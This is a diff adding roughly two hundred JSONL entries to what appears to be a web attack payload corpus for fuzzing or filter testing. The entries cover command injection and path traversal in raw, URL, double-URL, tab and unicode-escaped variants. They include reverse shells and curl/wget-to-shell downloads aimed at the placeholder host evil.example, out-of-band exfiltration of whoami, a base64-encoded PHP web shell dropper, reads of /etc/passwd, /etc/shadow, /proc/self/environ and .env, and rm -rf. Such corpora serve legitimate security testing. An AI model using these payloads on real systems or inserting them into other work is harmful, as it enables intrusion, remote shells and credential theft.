@@ -2079,3 +2079,208 @@
 {"category": "SCR", "path": "/", "param": "user-agent", "location": "header", "variant": "url+mixed", "payload": "rEQuire%28%22chilD_pROcEsS%22%29.sPawn%28%22sH%22%29", "base": "require(\"child_process\").spawn(\"sh\")"}
 {"category": "SCR", "path": "/api/search", "param": "q", "location": "query", "variant": "unicode-u", "payload": "require%u0028%u0022child_process%u0022%u0029.spawn%u0028%u0022sh%u0022%u0029", "base": "require(\"child_process\").spawn(\"sh\")"}
 {"category": "SCR", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url+mixed", "payload": "rEQuire%2528%2522chilD_pROcEsS%2522%2529.sPawn%2528%2522sH%2522%2529", "base": "require(\"child_process\").spawn(\"sh\")"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%3B%20cat%20%2Fetc%2Fpasswd", "base": "; cat /etc/passwd"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%3B%20cat%20%2Fetc%2Fpasswd", "base": "; cat /etc/passwd"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%253B%2520cat%2520%252Fetc%252Fpasswd", "base": "; cat /etc/passwd"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%3B%09cat%09%2Fetc%2Fpasswd", "base": "; cat /etc/passwd"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "unicode-u", "payload": "%u003b cat /etc/passwd", "base": "; cat /etc/passwd"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%3B+cat+%2Fetc%2Fpasswd", "base": "; cat /etc/passwd"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "| id", "base": "| id"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%7C%20id", "base": "| id"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%257C%2520id", "base": "| id"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "tab", "payload": "|\tid", "base": "| id"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "plus", "payload": "%7C+id", "base": "| id"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%26%26%20whoami", "base": "&& whoami"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%26%26%20whoami", "base": "&& whoami"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%2526%2526%2520whoami", "base": "&& whoami"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%26%26%09whoami", "base": "&& whoami"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%60id%60", "base": "`id`"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%60id%60", "base": "`id`"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%2560id%2560", "base": "`id`"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "$(whoami)", "base": "$(whoami)"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%24%28whoami%29", "base": "$(whoami)"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%2524%2528whoami%2529", "base": "$(whoami)"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "unicode-u", "payload": "%24%u0028whoami%u0029", "base": "$(whoami)"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%3B%20ls%20-la%20%2F", "base": "; ls -la /"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%3B%20ls%20-la%20%2F", "base": "; ls -la /"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%253B%2520ls%2520-la%2520%252F", "base": "; ls -la /"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%3B%09ls%09-la%09%2F", "base": "; ls -la /"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "unicode-u", "payload": "%u003b%20ls%20-la%20%2F", "base": "; ls -la /"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%7C%7C%20uname%20-a", "base": "|| uname -a"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%7C%7C%20uname%20-a", "base": "|| uname -a"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%257C%257C%2520uname%2520-a", "base": "|| uname -a"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%7C%7C%09uname%09-a", "base": "|| uname -a"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%7C%7C+uname+-a", "base": "|| uname -a"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "; sleep 5", "base": "; sleep 5"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%3B%20sleep%205", "base": "; sleep 5"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%253B%2520sleep%25205", "base": "; sleep 5"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "tab", "payload": ";\tsleep\t5", "base": "; sleep 5"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "unicode-u", "payload": "%u003b%20sleep%205", "base": "; sleep 5"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "plus", "payload": "%3B+sleep+5", "base": "; sleep 5"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%26%20ping%20-c%2010%20127.0.0.1%20%26", "base": "& ping -c 10 127.0.0.1 &"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%26%20ping%20-c%2010%20127.0.0.1%20%26", "base": "& ping -c 10 127.0.0.1 &"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%2526%2520ping%2520-c%252010%2520127.0.0.1%2520%2526", "base": "& ping -c 10 127.0.0.1 &"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%26%09ping%09-c%0910%09127.0.0.1%09%26", "base": "& ping -c 10 127.0.0.1 &"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "127.0.0.1%3B%20nc%20-e%20%2Fbin%2Fsh%20evil.example%204444", "base": "127.0.0.1; nc -e /bin/sh evil.example 4444"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "127.0.0.1%3B%20nc%20-e%20%2Fbin%2Fsh%20evil.example%204444", "base": "127.0.0.1; nc -e /bin/sh evil.example 4444"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "127.0.0.1%253B%2520nc%2520-e%2520%252Fbin%252Fsh%2520evil.example%25204444", "base": "127.0.0.1; nc -e /bin/sh evil.example 4444"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "127.0.0.1%3B%09nc%09-e%09%2Fbin%2Fsh%09evil.example%094444", "base": "127.0.0.1; nc -e /bin/sh evil.example 4444"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "unicode-u", "payload": "127.0.0.1%u003b nc -e /bin/sh evil.example 4444", "base": "127.0.0.1; nc -e /bin/sh evil.example 4444"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "127.0.0.1%3B+nc+-e+%2Fbin%2Fsh+evil.example+4444", "base": "127.0.0.1; nc -e /bin/sh evil.example 4444"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "; bash -i >& /dev/tcp/evil.example/4444 0>&1", "base": "; bash -i >& /dev/tcp/evil.example/4444 0>&1"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil.example%2F4444%200%3E%261", "base": "; bash -i >& /dev/tcp/evil.example/4444 0>&1"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%253B%2520bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252Fevil.example%252F4444%25200%253E%25261", "base": "; bash -i >& /dev/tcp/evil.example/4444 0>&1"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "tab", "payload": ";\tbash\t-i\t>&\t/dev/tcp/evil.example/4444\t0>&1", "base": "; bash -i >& /dev/tcp/evil.example/4444 0>&1"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "unicode-u", "payload": "%u003b%20bash%20-i%20%u003e%26%20%2Fdev%2Ftcp%2Fevil.example%2F4444%200%u003e%261", "base": "; bash -i >& /dev/tcp/evil.example/4444 0>&1"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "plus", "payload": "%3B+bash+-i+%3E%26+%2Fdev%2Ftcp%2Fevil.example%2F4444+0%3E%261", "base": "; bash -i >& /dev/tcp/evil.example/4444 0>&1"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%3B%20curl%20http%3A%2F%2Fevil.example%2Fx.sh%20%7C%20sh", "base": "; curl http://evil.example/x.sh | sh"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%3B%20curl%20http%3A%2F%2Fevil.example%2Fx.sh%20%7C%20sh", "base": "; curl http://evil.example/x.sh | sh"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%253B%2520curl%2520http%253A%252F%252Fevil.example%252Fx.sh%2520%257C%2520sh", "base": "; curl http://evil.example/x.sh | sh"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%3B%09curl%09http%3A%2F%2Fevil.example%2Fx.sh%09%7C%09sh", "base": "; curl http://evil.example/x.sh | sh"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "unicode-u", "payload": "%u003b%20curl%20http%3A%2F%2Fevil.example%2Fx.sh%20%7C%20sh", "base": "; curl http://evil.example/x.sh | sh"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%7C%20wget%20-qO-%20http%3A%2F%2Fevil.example%2Fx%20%7C%20bash", "base": "| wget -qO- http://evil.example/x | bash"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%7C%20wget%20-qO-%20http%3A%2F%2Fevil.example%2Fx%20%7C%20bash", "base": "| wget -qO- http://evil.example/x | bash"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%257C%2520wget%2520-qO-%2520http%253A%252F%252Fevil.example%252Fx%2520%257C%2520bash", "base": "| wget -qO- http://evil.example/x | bash"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%7C%09wget%09-qO-%09http%3A%2F%2Fevil.example%2Fx%09%7C%09bash", "base": "| wget -qO- http://evil.example/x | bash"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%7C+wget+-qO-+http%3A%2F%2Fevil.example%2Fx+%7C+bash", "base": "| wget -qO- http://evil.example/x | bash"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": ";cat${IFS}/etc/passwd", "base": ";cat${IFS}/etc/passwd"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd", "base": ";cat${IFS}/etc/passwd"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%253Bcat%2524%257BIFS%257D%252Fetc%252Fpasswd", "base": ";cat${IFS}/etc/passwd"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "unicode-u", "payload": "%u003bcat%24%7BIFS%7D%2Fetc%2Fpasswd", "base": ";cat${IFS}/etc/passwd"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%7Ccat%24IFS%249%2Fetc%2Fshadow", "base": "|cat$IFS$9/etc/shadow"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%7Ccat%24IFS%249%2Fetc%2Fshadow", "base": "|cat$IFS$9/etc/shadow"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%257Ccat%2524IFS%25249%252Fetc%252Fshadow", "base": "|cat$IFS$9/etc/shadow"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%26%20type%20C%3A%5CWindows%5Cwin.ini", "base": "& type C:\\Windows\\win.ini"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%26%20type%20C%3A%5CWindows%5Cwin.ini", "base": "& type C:\\Windows\\win.ini"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%2526%2520type%2520C%253A%255CWindows%255Cwin.ini", "base": "& type C:\\Windows\\win.ini"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%26%09type%09C%3A%5CWindows%5Cwin.ini", "base": "& type C:\\Windows\\win.ini"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%26+type+C%3A%5CWindows%5Cwin.ini", "base": "& type C:\\Windows\\win.ini"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "| powershell -enc SQBFAFgA", "base": "| powershell -enc SQBFAFgA"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%7C%20powershell%20-enc%20SQBFAFgA", "base": "| powershell -enc SQBFAFgA"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%257C%2520powershell%2520-enc%2520SQBFAFgA", "base": "| powershell -enc SQBFAFgA"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "tab", "payload": "|\tpowershell\t-enc\tSQBFAFgA", "base": "| powershell -enc SQBFAFgA"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "plus", "payload": "%7C+powershell+-enc+SQBFAFgA", "base": "| powershell -enc SQBFAFgA"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%26%20net%20user", "base": "& net user"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%26%20net%20user", "base": "& net user"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%2526%2520net%2520user", "base": "& net user"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%26%09net%09user", "base": "& net user"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%0Aid", "base": "\nid"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%0Aid", "base": "\nid"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%250Aid", "base": "\nid"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "127.0.0.1\nwhoami", "base": "127.0.0.1\nwhoami"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "127.0.0.1%0Awhoami", "base": "127.0.0.1\nwhoami"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "127.0.0.1%250Awhoami", "base": "127.0.0.1\nwhoami"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%24%28curl%20evil.example%2F%24%28whoami%29%29", "base": "$(curl evil.example/$(whoami))"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%24%28curl%20evil.example%2F%24%28whoami%29%29", "base": "$(curl evil.example/$(whoami))"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%2524%2528curl%2520evil.example%252F%2524%2528whoami%2529%2529", "base": "$(curl evil.example/$(whoami))"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%24%28curl%09evil.example%2F%24%28whoami%29%29", "base": "$(curl evil.example/$(whoami))"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "unicode-u", "payload": "%24%u0028curl%20evil.example%2F%24%u0028whoami%u0029%u0029", "base": "$(curl evil.example/$(whoami))"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%3B%20python3%20-c%20%27import%20os%3Bos.system%28%22id%22%29%27", "base": "; python3 -c 'import os;os.system(\"id\")'"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%3B%20python3%20-c%20%27import%20os%3Bos.system%28%22id%22%29%27", "base": "; python3 -c 'import os;os.system(\"id\")'"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%253B%2520python3%2520-c%2520%2527import%2520os%253Bos.system%2528%2522id%2522%2529%2527", "base": "; python3 -c 'import os;os.system(\"id\")'"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%3B%09python3%09-c%09%27import%09os%3Bos.system%28%22id%22%29%27", "base": "; python3 -c 'import os;os.system(\"id\")'"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "unicode-u", "payload": "%u003b python3 -c %u0027import os%u003bos.system%u0028%u0022id%u0022%u0029%u0027", "base": "; python3 -c 'import os;os.system(\"id\")'"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%3B+python3+-c+%27import+os%3Bos.system%28%22id%22%29%27", "base": "; python3 -c 'import os;os.system(\"id\")'"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "a;rm -rf /tmp/x", "base": "a;rm -rf /tmp/x"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "a%3Brm%20-rf%20%2Ftmp%2Fx", "base": "a;rm -rf /tmp/x"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "a%253Brm%2520-rf%2520%252Ftmp%252Fx", "base": "a;rm -rf /tmp/x"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "tab", "payload": "a;rm\t-rf\t/tmp/x", "base": "a;rm -rf /tmp/x"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "unicode-u", "payload": "a%u003brm%20-rf%20%2Ftmp%2Fx", "base": "a;rm -rf /tmp/x"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "plus", "payload": "a%3Brm+-rf+%2Ftmp%2Fx", "base": "a;rm -rf /tmp/x"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%7C%20nslookup%20evil.example", "base": "| nslookup evil.example"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%7C%20nslookup%20evil.example", "base": "| nslookup evil.example"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%257C%2520nslookup%2520evil.example", "base": "| nslookup evil.example"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%7C%09nslookup%09evil.example", "base": "| nslookup evil.example"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%3B%20echo%20PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs%3D%20%7C%20base64%20-d%20%3E%20shell.php", "base": "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%3B%20echo%20PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs%3D%20%7C%20base64%20-d%20%3E%20shell.php", "base": "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%253B%2520echo%2520PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs%253D%2520%257C%2520base64%2520-d%2520%253E%2520shell.php", "base": "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%3B%09echo%09PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs%3D%09%7C%09base64%09-d%09%3E%09shell.php", "base": "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "unicode-u", "payload": "%u003b echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs%u003d | base64 -d %u003e shell.php", "base": "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%3B+echo+PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs%3D+%7C+base64+-d+%3E+shell.php", "base": "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "raw", "payload": "& cmd /c whoami", "base": "& cmd /c whoami"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%26%20cmd%20%2Fc%20whoami", "base": "& cmd /c whoami"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "double-url", "payload": "%2526%2520cmd%2520%252Fc%2520whoami", "base": "& cmd /c whoami"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "tab", "payload": "&\tcmd\t/c\twhoami", "base": "& cmd /c whoami"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "plus", "payload": "%26+cmd+%2Fc+whoami", "base": "& cmd /c whoami"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%60sleep%2010%60", "base": "`sleep 10`"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "url", "payload": "%60sleep%2010%60", "base": "`sleep 10`"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "double-url", "payload": "%2560sleep%252010%2560", "base": "`sleep 10`"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "tab", "payload": "%60sleep%0910%60", "base": "`sleep 10`"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "raw", "payload": "%3B%20env", "base": "; env"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "url", "payload": "%3B%20env", "base": "; env"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%253B%2520env", "base": "; env"}
+{"category": "CMD", "path": "/api/tools/ping", "param": "host", "location": "query", "variant": "tab", "payload": "%3B%09env", "base": "; env"}
+{"category": "CMD", "path": "/api/feedback", "param": "message", "location": "json", "variant": "unicode-u", "payload": "%u003b env", "base": "; env"}
+{"category": "CMD", "path": "/api/files", "param": "name", "location": "form", "variant": "plus", "payload": "%3B+env", "base": "; env"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "base": "../../../../etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "base": "../../../../etc/passwd"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "..%252F..%252F..%252F..%252Fetc%252Fpasswd", "base": "../../../../etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini", "base": "..\\..\\..\\..\\windows\\win.ini"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini", "base": "..\\..\\..\\..\\windows\\win.ini"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "..%255C..%255C..%255C..%255Cwindows%255Cwin.ini", "base": "..\\..\\..\\..\\windows\\win.ini"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "....//....//....//etc/passwd", "base": "....//....//....//etc/passwd"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd", "base": "....//....//....//etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "....%252F%252F....%252F%252F....%252F%252Fetc%252Fpasswd", "base": "....//....//....//etc/passwd"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "%2Fetc%2Fpasswd", "base": "/etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "%2Fetc%2Fpasswd", "base": "/etc/passwd"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "%252Fetc%252Fpasswd", "base": "/etc/passwd"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "%2Fetc%2Fshadow", "base": "/etc/shadow"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "%2Fetc%2Fshadow", "base": "/etc/shadow"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "%252Fetc%252Fshadow", "base": "/etc/shadow"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "/proc/self/environ", "base": "/proc/self/environ"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "%2Fproc%2Fself%2Fenviron", "base": "/proc/self/environ"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "%252Fproc%252Fself%252Fenviron", "base": "/proc/self/environ"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts", "base": "../../../../../../etc/hosts"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts", "base": "../../../../../../etc/hosts"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "double-url", "payload": "..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fhosts", "base": "../../../../../../etc/hosts"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "raw", "payload": "..%2F%2F..%2F%2F..%2F%2Fetc%2Fpasswd", "base": "..//..//..//etc/passwd"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "url", "payload": "..%2F%2F..%2F%2F..%2F%2Fetc%2Fpasswd", "base": "..//..//..//etc/passwd"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "double-url", "payload": "..%252F%252F..%252F%252F..%252F%252Fetc%252Fpasswd", "base": "..//..//..//etc/passwd"}
+{"category": "PATH", "path": "/api/report", "param": "template", "location": "json", "variant": "raw", "payload": "../../WEB-INF/web.xml", "base": "../../WEB-INF/web.xml"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "url", "payload": "..%2F..%2FWEB-INF%2Fweb.xml", "base": "../../WEB-INF/web.xml"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "double-url", "payload": "..%252F..%252FWEB-INF%252Fweb.xml", "base": "../../WEB-INF/web.xml"}
+{"category": "PATH", "path": "/api/download", "param": "file", "location": "query", "variant": "raw", "payload": "..%2F..%2F..%2F.env", "base": "../../../.env"}
+{"category": "PATH", "path": "/api/files", "param": "name", "location": "form", "variant": "url", "payload": "..%2F..%2F..%2F.env", "base": "../../../.env"}
